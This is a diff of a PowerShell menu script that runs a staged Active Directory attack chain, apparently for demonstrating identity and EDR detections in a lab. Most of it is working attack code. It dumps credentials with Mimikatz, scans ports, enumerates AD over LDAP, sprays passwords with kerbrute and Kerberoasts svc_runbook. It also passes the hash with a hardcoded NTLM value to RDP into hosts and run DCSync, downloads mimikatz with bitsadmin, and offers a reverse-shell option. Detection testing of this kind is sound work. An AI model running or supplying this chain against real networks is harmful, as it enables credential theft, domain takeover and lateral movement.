@@ -1,4 +1,4 @@
-﻿﻿﻿﻿# ============================================================
+﻿# ============================================================
 #  Identity Attack Menu - Unmanaged Workstation
 #  Run as Administrator (demo account)
 #  Follows the phased scenario from portable_sender.py
@@ -40,24 +40,26 @@ function Show-Menu {
     Write-Host
     Write-Host "================ $Title ================" -ForegroundColor Cyan
     Write-Host
-    Write-Host "  Attack chain: demo (brute-forced) -> dump creds -> clark.monroe / svc_runbook -> PtH" -ForegroundColor DarkGray
+    Write-Host "  Kill chain: dump creds -> recon network -> LDAP enum -> spray" -ForegroundColor DarkGray
+    Write-Host "              -> PtH to DT (EDR) -> dump svc_runbook -> DCSync -> PtH to BL (EDR)" -ForegroundColor DarkGray
     Write-Host
-    Write-Host "  --- Phase 2: Initial Access (after brute force) ---" -ForegroundColor Yellow
-    Write-Host "  1: Dump local credentials (SAM + cached)     [Discover cached accounts]"
-    Write-Host "  2: Credential Scanning (kerbrute)             [CredentialScanning detection]"
+    Write-Host "  --- Phase 2: Initial Access (after brute force to unmanaged) ---" -ForegroundColor Yellow
+    Write-Host "  1: Dump local credentials (SAM + cached)       [Find clark.monroe NTLM]"
+    Write-Host "  2: Network discovery (ARP + port scan)          [Find DC, DT, BL on subnet]"
+    Write-Host "  3: LDAP recon (enumerate AD)                    [Discover svc_runbook, groups]"
+    Write-Host "  4: Credential Scanning (kerbrute spray)         [CredentialScanning detection]"
     Write-Host
-    Write-Host "  --- Phase 4: Recon & Privilege Escalation ---" -ForegroundColor Yellow
-    Write-Host "  3: AD-CS Recon (certipy)                      [Certificate template enum]"
-    Write-Host "  4: RDP to DT or BL as 'demo'                  [Lateral with low-priv account]"
-    Write-Host "  5: Dump creds on target (run ON DT/BL)        [Discover svc_runbook NTLM]"
+    Write-Host "  --- Phase 4: Pivot to DT (Falcon EDR triggers) ---" -ForegroundColor Yellow
+    Write-Host "  5: PtH clark.monroe -> RDP to DT                [PassTheHash + EDR: suspicious logon]"
+    Write-Host "  6: Dump creds on DT (run ON DT after Step 5)    [EDR: LSASS access, cred theft]"
     Write-Host
-    Write-Host "  --- Phase 5: Credential Attack ---" -ForegroundColor Yellow
-    Write-Host "  6: Kerberoast svc_runbook (has SPN)            [Kerberoasting detection]"
-    Write-Host "  7: PtH & DCSync (clark.monroe)                 [PassTheHash + DCSync]"
-    Write-Host "  8: PtH & RDP to BL (clark.monroe)              [PassTheHash lateral]"
+    Write-Host "  --- Phase 5: Privilege Escalation + Lateral ---" -ForegroundColor Yellow
+    Write-Host "  7: Kerberoast svc_runbook (SPN: web/svc_runbook) [Kerberoasting detection]"
+    Write-Host "  8: PtH svc_runbook -> DCSync                    [PassTheHash + StaleAccount + DCSync]"
+    Write-Host "  9: PtH svc_runbook -> RDP to BL                 [EDR: lateral movement to BL]"
     Write-Host
     Write-Host "  --- Optional ---" -ForegroundColor DarkGray
-    Write-Host "  9: Download & execute reverse shell             [C2 callback]"
+    Write-Host "  0: Download & execute reverse shell              [C2 callback]"
     Write-Host
     Write-Host "  Q: Quit" -ForegroundColor Red
     Write-Host
@@ -65,8 +67,8 @@ function Show-Menu {
 
 do {
     Show-Menu
-    $input = Read-Host "Select step"
-    switch ($input) {
+    $selection = Read-Host "Select step"
+    switch ($selection) {
 
         '1' {
             Clear-Host
@@ -74,104 +76,236 @@ do {
             Write-Host "         Looking for cached domain accounts on this unmanaged host..." -ForegroundColor Gray
             Write-Host
 
-            # Show who has logged in
             Write-Host "--- User profiles on this machine ---" -ForegroundColor Yellow
             dir C:\Users | Select-Object Name | Format-Table -AutoSize
 
             Write-Host "--- Local accounts ---" -ForegroundColor Yellow
             net user
 
-            # Mimikatz - elevate to SYSTEM first, then dump SAM + cached + logonpasswords
             & $mimiExe "privilege::debug" "token::elevate" "log $idpDir\step1_cred_dump.log" "lsadump::sam" "lsadump::cache" "sekurlsa::logonpasswords" "exit"
 
             Write-Host "`n[+] Output saved to: $idpDir\step1_cred_dump.log" -ForegroundColor Green
-            Write-Host "[*] Found cached: clark.monroe NTLM: 802ec5974a4f18e086e8b1411b2e3ea3" -ForegroundColor Cyan
-            Write-Host "[*] To find svc_runbook, RDP to DT/BL (Step 4) then dump there (Step 5)." -ForegroundColor Cyan
+            Write-Host "[*] Expected finding: clark.monroe NTLM: 802ec5974a4f18e086e8b1411b2e3ea3" -ForegroundColor Cyan
+            Write-Host "[*] Next: Step 2 (network discovery) to find targets on the subnet." -ForegroundColor Cyan
         }
 
         '2' {
             Clear-Host
-            Write-Host "[Step 2] Credential Scanning - kerbrute" -ForegroundColor Cyan
+            Write-Host "[Step 2] Network Discovery" -ForegroundColor Cyan
+            Write-Host "         Scanning local subnet for DC, DT, BL..." -ForegroundColor Gray
+            Write-Host "         Generates traffic matching FortiGate port scan logs" -ForegroundColor Yellow
+            Write-Host
+
+            # ARP table - see what's already known
+            Write-Host "--- ARP Table (known hosts) ---" -ForegroundColor Yellow
+            arp -a
+            Write-Host
+
+            # Key targets - probe important ports
+            $targets = @{
+                "DC  ($env:ENV_DC_IP)" = @(88, 389, 445, 636)
+                "DT  ($env:ENV_DT)"    = @(3389, 445, 5985, 135)
+                "BL  ($env:ENV_BL)"    = @(3389, 445, 5985, 135)
+            }
+
+            Write-Host "--- Port scan of key targets ---" -ForegroundColor Yellow
+            foreach ($target in $targets.GetEnumerator()) {
+                Write-Host "`n  Target: $($target.Key)" -ForegroundColor White
+                $ip = ($target.Key -split '[()]')[1].Trim()
+                foreach ($port in $target.Value) {
+                    $tcp = New-Object System.Net.Sockets.TcpClient
+                    try {
+                        $tcp.ConnectAsync($ip, $port).Wait(1000) | Out-Null
+                        if ($tcp.Connected) {
+                            Write-Host "    Port $port : OPEN" -ForegroundColor Green
+                        } else {
+                            Write-Host "    Port $port : CLOSED/FILTERED" -ForegroundColor Red
+                        }
+                    } catch {
+                        Write-Host "    Port $port : CLOSED/FILTERED" -ForegroundColor Red
+                    }
+                    $tcp.Close()
+                }
+            }
+
+            Write-Host "`n[+] Network discovery complete." -ForegroundColor Green
+            Write-Host "[*] DC identified at $env:ENV_DC_IP (Kerberos:88, LDAP:389)" -ForegroundColor Cyan
+            Write-Host "[*] Next: Step 3 (LDAP recon) to enumerate AD users and service accounts." -ForegroundColor Cyan
+        }
+
+        '3' {
+            Clear-Host
+            Write-Host "[Step 3] LDAP Reconnaissance" -ForegroundColor Cyan
+            Write-Host "         Using clark.monroe creds to enumerate Active Directory..." -ForegroundColor Gray
+            Write-Host "         Generates LDAP traffic matching FortiGate sample [108]" -ForegroundColor Yellow
+            Write-Host
+
+            try {
+                $ldapPath = "LDAP://$env:ENV_DC_IP"
+                $cred_user = "clark.monroe@$env:ENV_DOMAIN"
+                $cred_pass = "$env:ENV_PASSWORD"
+                $entry = New-Object DirectoryServices.DirectoryEntry($ldapPath, $cred_user, $cred_pass)
+                $searcher = New-Object DirectoryServices.DirectorySearcher($entry)
+
+                # Enumerate all users
+                Write-Host "--- Domain Users ---" -ForegroundColor Yellow
+                $searcher.Filter = "(&(objectCategory=person)(objectClass=user))"
+                $searcher.PropertiesToLoad.AddRange(@("samaccountname","displayname","memberof","pwdlastset","serviceprincipalname","lastlogon"))
+                $results = $searcher.FindAll()
+
+                $svcAccounts = @()
+                foreach ($r in $results) {
+                    $sam = $r.Properties["samaccountname"][0]
+                    $display = if ($r.Properties["displayname"].Count -gt 0) { $r.Properties["displayname"][0] } else { "-" }
+                    $spns = $r.Properties["serviceprincipalname"]
+                    $memberof = $r.Properties["memberof"]
+                    $lastlogon = $r.Properties["lastlogon"]
+
+                    $privGroups = @()
+                    foreach ($grp in $memberof) {
+                        if ($grp -match "Domain Admins|Enterprise Admins|Administrators|Account Operators") {
+                            $privGroups += ($grp -split ',')[0] -replace 'CN=',''
+                        }
+                    }
+
+                    $prefix = "  "
+                    if ($spns.Count -gt 0) {
+                        $prefix = "* "
+                        $svcAccounts += $sam
+                    }
+                    if ($privGroups.Count -gt 0) {
+                        $prefix = "! "
+                    }
+
+                    $line = "${prefix}${sam}"
+                    if ($privGroups.Count -gt 0) { $line += " [PRIV: $($privGroups -join ', ')]" }
+                    if ($spns.Count -gt 0) { $line += " [SPN: $($spns -join ', ')]" }
+
+                    Write-Host $line -ForegroundColor $(if ($prefix -eq "! ") { "Red" } elseif ($prefix -eq "* ") { "Yellow" } else { "Gray" })
+                }
+
+                Write-Host "`n  Legend: ! = privileged group  * = has SPN (kerberoastable)" -ForegroundColor DarkGray
+                Write-Host "  Total users found: $($results.Count)" -ForegroundColor White
+
+                # Save user list for kerbrute
+                $userList = $results | ForEach-Object { $_.Properties["samaccountname"][0] }
+                $userList | Out-File -FilePath "$idpDir\ldap_users.txt" -Encoding ASCII
+                Write-Host "`n[+] User list saved to: $idpDir\ldap_users.txt (for kerbrute)" -ForegroundColor Green
+
+                if ($svcAccounts.Count -gt 0) {
+                    Write-Host "[!] Kerberoastable accounts found: $($svcAccounts -join ', ')" -ForegroundColor Red
+                }
+
+                $results.Dispose()
+                $entry.Close()
+            } catch {
+                Write-Host "[!] LDAP query failed: $_" -ForegroundColor Red
+                Write-Host "    If clark.monroe password is wrong, try natasha creds instead." -ForegroundColor Yellow
+            }
+
+            Write-Host "`n[*] Next: Step 4 (kerbrute) using the LDAP-harvested user list." -ForegroundColor Cyan
+        }
+
+        '4' {
+            Clear-Host
+            Write-Host "[Step 4] Credential Scanning - kerbrute" -ForegroundColor Cyan
             Write-Host "         Spraying password against AD accounts..." -ForegroundColor Gray
             Write-Host "         Triggers: CredentialScanningActiveDirectory" -ForegroundColor Yellow
             Write-Host
+
+            # Use LDAP-harvested list if available, fallback to static list
+            $userFile = "$idpDir\ldap_users.txt"
+            if (-not (Test-Path $userFile)) {
+                $userFile = "$idpDir\users.txt"
+                Write-Host "         Using static user list (run Step 3 first for LDAP list)" -ForegroundColor Yellow
+            } else {
+                Write-Host "         Using LDAP-harvested user list" -ForegroundColor Green
+            }
             Write-Host "         DC: $env:ENV_DC_IP  Domain: $env:ENV_DOMAIN" -ForegroundColor Gray
             Write-Host
 
             try {
                 $proc = Start-Process -FilePath "$idpDir\kerbrute.exe" `
-                    -ArgumentList "passwordspray --dc $env:ENV_DC_IP -d $env:ENV_DOMAIN `"$idpDir\users.txt`" $env:ENV_PASSWORD" `
+                    -ArgumentList "passwordspray --dc $env:ENV_DC_IP -d $env:ENV_DOMAIN `"$userFile`" $env:ENV_PASSWORD" `
                     -NoNewWindow -Wait -PassThru
                 Write-Host "`n[+] Kerbrute finished (exit code: $($proc.ExitCode))." -ForegroundColor Green
             } catch {
                 Write-Host "[!] Kerbrute error: $_" -ForegroundColor Red
             }
-        }
 
-        '3' {
-            Clear-Host
-            Write-Host "[Step 3] AD-CS Recon - certipy" -ForegroundColor Cyan
-            Write-Host "         Enumerating certificate templates..." -ForegroundColor Gray
-            Write-Host
-
-            & "C:\Program Files\Python312\Scripts\certipy" find -u "natasha@$env:ENV_DOMAIN" -p $env:ENV_PASSWORD -dc-ip $env:ENV_DC_IP -debug
-        }
-
-        '4' {
-            Clear-Host
-            Write-Host "[Step 4] RDP to target as 'demo'" -ForegroundColor Cyan
-            Write-Host "         demo is a domain account with local admin on DT and BL." -ForegroundColor Gray
-            Write-Host
-            Write-Host "  Choose target:" -ForegroundColor Yellow
-            Write-Host "    A: RDP to DT ($env:ENV_DT)"
-            Write-Host "    B: RDP to BL ($env:ENV_BL)"
-            $target = Read-Host "Select (A/B)"
-            switch ($target) {
-                'A' {
-                    Write-Host "Launching RDP to DT ($env:ENV_DT)..." -ForegroundColor Cyan
-                    mstsc /v:$env:ENV_DT
-                }
-                'B' {
-                    Write-Host "Launching RDP to BL ($env:ENV_BL)..." -ForegroundColor Cyan
-                    mstsc /v:$env:ENV_BL
-                }
-                default { Write-Host "Invalid selection." -ForegroundColor Red }
-            }
+            Write-Host "[*] Next: Step 5 (PtH clark.monroe -> RDP to DT)." -ForegroundColor Cyan
         }
 
         '5' {
             Clear-Host
-            Write-Host "[Step 5] Dump credentials on target machine" -ForegroundColor Cyan
-            Write-Host "         Run this AFTER RDP'ing to DT or BL as 'demo' (Step 4)." -ForegroundColor Yellow
-            Write-Host "         This should be run ON the target machine, not here." -ForegroundColor Yellow
+            Write-Host "[Step 5] PtH clark.monroe -> RDP to DT" -ForegroundColor Cyan
+            Write-Host "         Using clark.monroe NTLM hash from Step 1 dump..." -ForegroundColor Gray
+            Write-Host "         Triggers: PassTheHash (Identity) + suspicious logon (EDR on DT)" -ForegroundColor Yellow
             Write-Host
-            Write-Host "  On the target machine, open admin cmd/PowerShell and run:" -ForegroundColor Gray
+
+            $ntlm = "802ec5974a4f18e086e8b1411b2e3ea3"
+            Write-Host "  User:   clark.monroe" -ForegroundColor White
+            Write-Host "  Domain: $env:ENV_DOMAIN" -ForegroundColor White
+            Write-Host "  NTLM:   $ntlm" -ForegroundColor White
+            Write-Host "  Target: $env:ENV_DT (DT)" -ForegroundColor White
             Write-Host
-            Write-Host '  mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"' -ForegroundColor White
-            Write-Host
-            Write-Host "  Look for:" -ForegroundColor Cyan
-            Write-Host "    User: svc_runbook" -ForegroundColor White
-            Write-Host "    Domain: $env:ENV_DOMAIN" -ForegroundColor White
-            Write-Host "    NTLM: <copy this hash for Steps 7 and 8>" -ForegroundColor White
-            Write-Host
-            Write-Host "  Once you have the hash, edit these files in C:\IDP_Files:" -ForegroundColor Gray
-            Write-Host "    - PtH_DCSync.bat            (set NTLM_HASH=...)" -ForegroundColor Gray
-            Write-Host "    - PtH_RDP_From_Unmanaged.bat (set NTLM_HASH=...)" -ForegroundColor Gray
+
+            # PtH then launch RDP to DT
+            Start-Process -FilePath "cmd.exe" -ArgumentList "/k `"$mimiExe`" `"privilege::debug`" `"sekurlsa::pth /user:clark.monroe /domain:$env:ENV_DOMAIN /ntlm:$ntlm /run:mstsc.exe /v:$env:ENV_DT`""
+
+            Write-Host "[+] Mimikatz PtH launched - RDP window should open to DT." -ForegroundColor Green
+            Write-Host "[*] On DT: open admin cmd and run Step 6 commands to dump svc_runbook." -ForegroundColor Cyan
         }
 
         '6' {
             Clear-Host
-            Write-Host "[Step 6] Kerberoasting - svc_runbook (SPN: web/svc_runbook)" -ForegroundColor Cyan
+            Write-Host "[Step 6] Dump credentials on DT" -ForegroundColor Cyan
+            Write-Host "         Run these commands ON DT after RDP'ing in Step 5." -ForegroundColor Yellow
+            Write-Host "         Triggers: EDR LSASS access, credential dumping alert" -ForegroundColor Yellow
+            Write-Host
+            Write-Host "  Copy mimikatz to DT first (from unmanaged via SMB or download):" -ForegroundColor Gray
+            Write-Host
+            Write-Host "    Option A - Copy from unmanaged host:" -ForegroundColor White
+            Write-Host "      copy \\$(hostname)\c$\IDP_Files\Mimikatz\x64\mimikatz.exe C:\Temp\" -ForegroundColor White
+            Write-Host
+            Write-Host "    Option B - Download on DT:" -ForegroundColor White
+            Write-Host "      bitsadmin /transfer m https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip C:\Temp\mimi.zip" -ForegroundColor White
+            Write-Host
+            Write-Host "  Then run:" -ForegroundColor Gray
+            Write-Host
+            Write-Host '    mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"' -ForegroundColor White
+            Write-Host
+            Write-Host "  Look for:" -ForegroundColor Cyan
+            Write-Host "    User: svc_runbook" -ForegroundColor White
+            Write-Host "    Domain: $env:ENV_DOMAIN" -ForegroundColor White
+            Write-Host "    NTLM: <copy this hash>" -ForegroundColor White
+            Write-Host
+            Write-Host "  Once you have the svc_runbook NTLM hash, enter it here:" -ForegroundColor Yellow
+            $svcHash = Read-Host "  svc_runbook NTLM hash (or press Enter to skip)"
+
+            if ($svcHash -and $svcHash.Length -eq 32) {
+                # Save hash for steps 8 and 9
+                $svcHash | Out-File -FilePath "$idpDir\svc_runbook_hash.txt" -Encoding ASCII
+                Write-Host "`n[+] Hash saved to $idpDir\svc_runbook_hash.txt" -ForegroundColor Green
+                Write-Host "[*] Steps 8 and 9 will use this hash automatically." -ForegroundColor Cyan
+            } elseif ($svcHash) {
+                Write-Host "[!] Hash should be 32 hex characters. Save it manually and update bat files." -ForegroundColor Red
+            } else {
+                Write-Host "[*] Skipped. You can manually update PtH bat files later." -ForegroundColor Yellow
+            }
+        }
+
+        '7' {
+            Clear-Host
+            Write-Host "[Step 7] Kerberoasting - svc_runbook (SPN: web/svc_runbook)" -ForegroundColor Cyan
             Write-Host "         Requesting TGS for service accounts with SPNs..." -ForegroundColor Gray
             Write-Host "         Triggers: Kerberoasting detection" -ForegroundColor Yellow
             Write-Host
 
-            # Using Rubeus if available
             if (Test-Path "$idpDir\Rubeus.exe") {
                 & "$idpDir\Rubeus.exe" kerberoast /user:svc_runbook /domain:$env:ENV_DOMAIN /dc:$env:ENV_DC_IP /outfile:"$idpDir\kerberoast_hashes.txt"
                 Write-Host "`n[+] TGS hash saved to: $idpDir\kerberoast_hashes.txt" -ForegroundColor Green
             }
-            # Fallback: impacket GetUserSPNs
             elseif (Test-Path "C:\Program Files\Python312\Scripts\GetUserSPNs.exe") {
                 & "C:\Program Files\Python312\Scripts\GetUserSPNs.exe" "$env:ENV_DOMAIN/natasha:$env:ENV_PASSWORD" -dc-ip $env:ENV_DC_IP -request-user svc_runbook -outputfile "$idpDir\kerberoast_hashes.txt"
             }
@@ -182,29 +316,70 @@ do {
             }
         }
 
-        '7' {
+        '8' {
             Clear-Host
-            Write-Host "[Step 7] PtH & DCSync - clark.monroe" -ForegroundColor Cyan
-            Write-Host "         Using clark.monroe NTLM hash for Pass-the-Hash..." -ForegroundColor Gray
+            Write-Host "[Step 8] PtH svc_runbook -> DCSync" -ForegroundColor Cyan
+            Write-Host "         Using svc_runbook NTLM hash for Pass-the-Hash..." -ForegroundColor Gray
             Write-Host "         Triggers: PassTheHash, StaleAccount, DCSync" -ForegroundColor Yellow
             Write-Host
 
-            Start-Process -FilePath "cmd.exe" -ArgumentList "/k `"$idpDir\PtH_DCSync.bat`"" -Wait
-        }
+            # Load hash from Step 6 if saved
+            $hashFile = "$idpDir\svc_runbook_hash.txt"
+            if (Test-Path $hashFile) {
+                $svcHash = (Get-Content $hashFile -First 1).Trim()
+                Write-Host "  Using saved hash from Step 6: $svcHash" -ForegroundColor Green
+            } else {
+                $svcHash = Read-Host "  Enter svc_runbook NTLM hash"
+            }
 
-        '8' {
-            Clear-Host
-            Write-Host "[Step 8] PtH & RDP to BL - clark.monroe" -ForegroundColor Cyan
-            Write-Host "         Lateral movement to managed host..." -ForegroundColor Gray
-            Write-Host "         Triggers: PassTheHash (second hit)" -ForegroundColor Yellow
-            Write-Host
+            if (-not $svcHash -or $svcHash.Length -ne 32) {
+                Write-Host "[!] Invalid hash. Run Step 6 first." -ForegroundColor Red
+            } else {
+                Write-Host "  User:   svc_runbook" -ForegroundColor White
+                Write-Host "  Domain: $env:ENV_DOMAIN" -ForegroundColor White
+                Write-Host "  NTLM:   $svcHash" -ForegroundColor White
+                Write-Host
 
-            Start-Process -FilePath "cmd.exe" -ArgumentList "/k `"$idpDir\PtH_RDP_From_Unmanaged.bat`"" -Wait
+                Start-Process -FilePath "cmd.exe" -ArgumentList "/k `"$mimiExe`" `"privilege::debug`" `"sekurlsa::pth /user:svc_runbook /domain:$env:ENV_DOMAIN /ntlm:$svcHash /run:c:\IDP_Files\Post_PtH_DCSync.bat`""
+
+                Write-Host "[+] PtH launched - DCSync should execute in new window." -ForegroundColor Green
+            }
         }
 
         '9' {
             Clear-Host
-            Write-Host "[Step 9] Download & execute reverse shell" -ForegroundColor Cyan
+            Write-Host "[Step 9] PtH svc_runbook -> RDP to BL" -ForegroundColor Cyan
+            Write-Host "         Lateral movement to managed host (Falcon EDR)..." -ForegroundColor Gray
+            Write-Host "         Triggers: PassTheHash (Identity) + lateral movement (EDR on BL)" -ForegroundColor Yellow
+            Write-Host
+
+            # Load hash from Step 6 if saved
+            $hashFile = "$idpDir\svc_runbook_hash.txt"
+            if (Test-Path $hashFile) {
+                $svcHash = (Get-Content $hashFile -First 1).Trim()
+                Write-Host "  Using saved hash from Step 6: $svcHash" -ForegroundColor Green
+            } else {
+                $svcHash = Read-Host "  Enter svc_runbook NTLM hash"
+            }
+
+            if (-not $svcHash -or $svcHash.Length -ne 32) {
+                Write-Host "[!] Invalid hash. Run Step 6 first." -ForegroundColor Red
+            } else {
+                Write-Host "  User:   svc_runbook" -ForegroundColor White
+                Write-Host "  Domain: $env:ENV_DOMAIN" -ForegroundColor White
+                Write-Host "  NTLM:   $svcHash" -ForegroundColor White
+                Write-Host "  Target: $env:ENV_BL (BL)" -ForegroundColor White
+                Write-Host
+
+                Start-Process -FilePath "cmd.exe" -ArgumentList "/k `"$mimiExe`" `"privilege::debug`" `"sekurlsa::pth /user:svc_runbook /domain:$env:ENV_DOMAIN /ntlm:$svcHash /run:mstsc.exe /v:$env:ENV_BL`""
+
+                Write-Host "[+] PtH launched - RDP window should open to BL." -ForegroundColor Green
+            }
+        }
+
+        '0' {
+            Clear-Host
+            Write-Host "[Step 0] Download & execute reverse shell" -ForegroundColor Cyan
             Write-Host "         Make sure listener is running on attacker host first!" -ForegroundColor Yellow
             Write-Host
 
@@ -216,4 +391,4 @@ do {
     }
     pause
 }
-until ($input -eq 'q')
+until ($selection -eq 'q')
